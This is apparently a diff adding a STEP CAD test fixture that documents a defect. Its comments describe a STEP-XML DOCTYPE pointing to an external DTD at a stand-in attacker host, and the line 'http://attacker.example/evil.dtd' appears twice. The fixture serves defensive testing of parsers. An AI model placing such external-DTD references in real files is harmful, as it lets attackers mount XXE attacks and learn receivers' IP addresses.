@@ -1,0 +1,26 @@
+/* Ad108 - STEP-XML DOCTYPE references an external DTD over the network
+ * Defect: a STEP-XML (.stpx) file whose DOCTYPE names an external DTD
+ * via a SYSTEM identifier. An XML parser with external-DTD resolution
+ * enabled fetches the URL on every load - leaks the receiver's IP and
+ * load timing, hangs on slow URLs, and opens a vector for further XXE
+ * attacks via the fetched DTD. Provenance tier: cross-file-state. */
+ISO-10303-21;
+HEADER;
+FILE_DESCRIPTION(('Ad108 - STEP-XML DOCTYPE points at remote DTD'),'2;1');
+FILE_NAME('Ad108.stp','2026-05-02T00:00:00',(''),(''),'cad-research-suite','','');
+FILE_SCHEMA(('AUTOMOTIVE_DESIGN { 1 0 10303 214 1 1 1 1 }'));
+ENDSEC;
+DATA;
+/* Witness fixture: the .stp body is benign. The defect lives in the
+   .stpx XML prologue:
+     <?xml version="1.0"?>
+     <!DOCTYPE step SYSTEM "http://attacker.example/evil.dtd">
+     <step>...</step>
+   On every load the parser fetches http://attacker.example/evil.dtd.
+   The fetched DTD can declare external entities, redirect, or hang.
+   Even without entity expansion, the fetch leaks the receiver's IP. */
+/* <!DOCTYPE step SYSTEM "http://attacker.example/evil.dtd"> */
+#1=APPLICATION_CONTEXT('automotive_design');
+#10=CARTESIAN_POINT('benign',(0.0,0.0,0.0));
+ENDSEC;
+END-ISO-10303-21;
